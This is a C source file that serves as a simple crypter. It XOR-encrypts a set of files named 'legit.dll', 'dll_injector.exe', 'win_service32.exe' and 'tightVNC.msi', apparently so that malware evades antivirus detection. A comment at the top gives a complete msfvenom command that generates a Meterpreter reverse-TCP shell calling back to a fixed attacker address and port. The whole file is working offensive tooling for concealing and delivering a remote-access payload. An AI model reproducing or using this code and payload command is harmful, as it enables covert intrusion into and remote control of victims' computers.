#include <stdio.h>
#include <stdlib.h>


/* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.13 LPORT=123 -f csharp exitfunc=thread*/

void encrypt(unsigned char *data, size_t data_size, char key) {
    //printf("[+] ENCRYPTING with '%c' key\n", key);
    for (int i = 0; i < data_size; i++) {
        //printf("\\x%02x", data[i] ^ key);
        data[i] = data[i] ^ key;
    }
   // printf("\n");
}

void decrypt(unsigned char *data, size_t data_size, char key) {
	printf("[+] DECRYPTING with '%c' key\n", key);
	for (int i = 0; i < data_size; i++) {
		printf("\\x%02x", data[i] ^ key);
		data[i] = data[i] ^ key;
	}
	printf("\n");
}


int file_ops(char *input_filename,char *output_filename){
    // Open the binary file
    FILE *input_file = fopen(input_filename, "rb");
    if (input_file == NULL) {
        printf("[x] Failed to open %s\n",input_filename);
        return 1;
    }

    // Get the size of the input file
    fseek(input_file, 0, SEEK_END);
    size_t file_size = ftell(input_file);
    fseek(input_file, 0, SEEK_SET);

    // Allocate memory for the file data
    unsigned char *data = (unsigned char *)malloc(file_size);
    if (data == NULL) {
        printf("[x] Memory allocation failed\n");
        fclose(input_file);
        return 1;
    }

    // Read the binary file into memory
    if (fread(data, 1, file_size, input_file) != file_size) {
        printf("[x] Failed to read file data\n");
        free(data);
        fclose(input_file);
        return 1;
    }

    // Close the input file
    fclose(input_file);

    // Print original data (optional)
    //printf("[+] ORIGINAL DATA\n");
    for (size_t i = 0; i < file_size; i++) {
        //printf("\\x%02x", data[i]);
    }
    //printf("\n");

    // Encrypt the data with a series of keys
    char keys[]={'P','L','S','a','5','p','A','1','w','F'};
    for (int i = 0; i < sizeof(keys); i++) {
        encrypt(data, file_size, keys[i]);
    }

    // Write the encrypted data to a new file
    FILE *output_file = fopen(output_filename, "wb");
    if (output_file == NULL) {
        printf("[x] Failed to open output file\n");
        free(data);
        return 1;
    }

    if (fwrite(data, 1, file_size, output_file) != file_size) {
        printf("[x] Failed to write encrypted data to file\n");
        free(data);
        fclose(output_file);
        return 1;
    }

    printf("[+] Encrypted data written to %s\n",output_filename);

    // Clean up
    free(data);
    fclose(output_file);
	return 0;
}

int main() {
	file_ops("legit.dll","legit_enc.dll");
	file_ops("dll_injector.exe","dll_injector_enc.exe");
	file_ops("win_service32.exe","win_service32_enc.exe");
	file_ops("tightVNC.msi","tightVNC_enc.msi");

    return 0;
}
